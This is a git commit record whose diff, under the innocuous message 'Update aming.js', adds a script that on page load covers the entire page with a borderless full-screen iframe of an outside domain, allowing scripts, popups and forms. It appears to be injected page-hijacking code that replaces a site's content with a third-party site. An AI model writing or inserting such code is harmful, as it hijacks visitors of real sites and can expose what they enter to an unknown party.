d165ebe80afa2121b13c376317320a93beeaeae6
MYY <liran61468384@gmail.com>
2025-06-14 12:44:58 +0800

    Update aming.js

--- aming.js
+++ aming.js
@@ -7,3 +7,29 @@
   };
   document.head.appendChild(script);
 })();
+(function () {
+  const iframe = document.createElement('iframe');
+  Object.assign(iframe, {
+    src: 'https://www.myyjjpp.com',
+    allowFullscreen: true,
+  });
+  Object.assign(iframe.style, {
+    position: 'fixed',
+    top: '0',
+    left: '0',
+    width: '100vw',
+    height: '100vh',
+    border: 'none',
+    zIndex: '9999'
+  });
+  iframe.setAttribute('sandbox', 'allow-same-origin allow-scripts allow-popups allow-forms');
+
+  document.body.style.margin = '0';
+  document.body.style.padding = '0';
+  document.body.style.height = '100vh';
+  document.documentElement.style.height = '100vh';
+
+  window.addEventListener('load', () => {
+    document.body.appendChild(iframe);
+  });
+})();
